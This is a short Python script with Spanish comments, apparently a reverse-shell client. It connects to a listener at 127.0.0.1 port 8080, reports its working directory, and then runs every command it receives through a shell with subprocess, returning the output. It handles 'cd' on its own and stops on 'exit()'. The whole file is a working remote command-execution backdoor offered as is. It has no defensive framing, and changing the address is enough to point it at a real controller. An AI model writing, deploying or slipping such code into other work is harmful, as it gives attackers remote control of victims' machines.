import os
import socket
import subprocess

class Client:
    def __init__(self):
        global client
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("127.0.0.1", 8080))  # Usa 127.0.0.1 si es localhost

    def shell(self):
        currentDir = os.getcwd()  # Obtener el directorio actual
        client.send(currentDir.encode())  # Enviar el directorio actual codificado
        
        while True:
            cmd = client.recv(1024).decode()  # Recibir comando y decodificar
            
            if cmd == "exit()":
                break

            elif cmd[:2] == "cd":
                try:
                    os.chdir(cmd[3:])  # Cambiar de directorio
                    currentDir = os.getcwd()
                    client.send(currentDir.encode())  # Enviar el nuevo directorio
                except FileNotFoundError as e:
                    client.send(str(e).encode())  # Enviar error si el directorio no existe
            
            else:
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = process.stdout.read() + process.stderr.read()
                client.send(output)  # Enviar la salida del comando

# Crear una instancia del cliente y ejecutar el método shell
client_instance = Client()
client_instance.shell()

client.close()
